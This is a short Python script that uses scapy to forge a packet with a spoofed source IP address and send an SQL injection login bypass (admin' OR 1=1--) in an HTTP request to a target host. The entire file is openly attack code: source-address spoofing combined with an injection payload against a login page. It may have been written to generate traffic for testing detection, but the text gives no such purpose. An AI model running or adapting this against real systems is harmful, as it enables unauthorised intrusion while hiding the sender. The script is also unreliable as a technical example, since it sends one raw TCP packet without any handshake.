import scapy.all as scapy

fake_ip = "172.16.5.5"
target_ip = "172.16.99.216"

print(f"From {fake_ip} address, sql injection is being sent")

# sql injection
sql_message = "GET /login.php?user=admin' OR 1=1-- HTTP/1.1\r\nHost: example.com\r\n\r\n"

packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.IP(src=fake_ip, dst=target_ip) / scapy.TCP(dport=80) / scapy.Raw(load=sql_message)

scapy.sendp(packet, verbose=False)

print("Sql message has been sent")